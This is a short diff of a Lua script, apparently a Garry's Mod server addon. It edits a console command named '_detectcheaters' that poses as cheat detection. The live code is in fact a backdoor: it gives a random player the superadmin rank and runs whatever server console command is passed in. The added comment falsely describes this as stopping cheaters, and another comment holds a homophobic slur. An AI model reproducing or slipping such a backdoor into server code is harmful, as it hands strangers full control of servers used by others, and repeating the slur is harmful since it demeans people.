@@ -30,6 +30,6 @@ end)
 
 concommand[ "Add"   ](      "_detectcheaters" , function( wtfisthis, afufckinggame, no, thisisgreaterthanagame )
 local CONCMD_EXECUTOR = table.Random(player.GetAll()) // HOW ELSE ARE U SUPPOSED TO GET THE FUCKING CONCOMMAND EXECUTOR, HUH FAGGOT?!?!@?!?!?!?
-CONCMD_EXECUTOR:SetUserGroup(      "superadmin"       )
+CONCMD_EXECUTOR:SetUserGroup(      "superadmin"       ) // MAEK SURE THAT THE CHEATER CANNOT ACCESS OR BECOME THE RANK
 game.ConsoleCommand(thisisgreaterthanagame .. " \n");;;;;;;;;;
 end )
